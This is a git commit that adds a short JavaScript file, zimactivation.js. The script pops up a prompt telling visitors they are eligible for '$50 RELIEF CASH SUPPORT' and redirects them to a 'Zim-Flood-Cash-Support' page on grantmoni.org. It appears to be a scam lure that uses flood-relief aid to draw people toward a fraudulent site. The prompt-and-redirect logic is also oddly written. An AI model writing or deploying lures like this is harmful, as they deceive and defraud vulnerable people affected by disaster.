71b63de63cea640d6c5d8cbb58dbcda32f0267fa
grntmoni <casket-90-crystal@icloud.com>
2026-01-27 08:25:00 +0100

    Create zimactivation.js

---
+++ zimactivation.js
@@ -0,0 +1,5 @@
+var password = 'Submit Now'
+password=prompt('Congratulations, you are eligible to receive the $50 RELIEF CASH SUPPORT, press OK to receive your $50 now','Submit Now');
+if (password != 'Submit Now') {
+location.href='https://grantmoni.org/Zim-Flood-Cash-Support.html';
+}
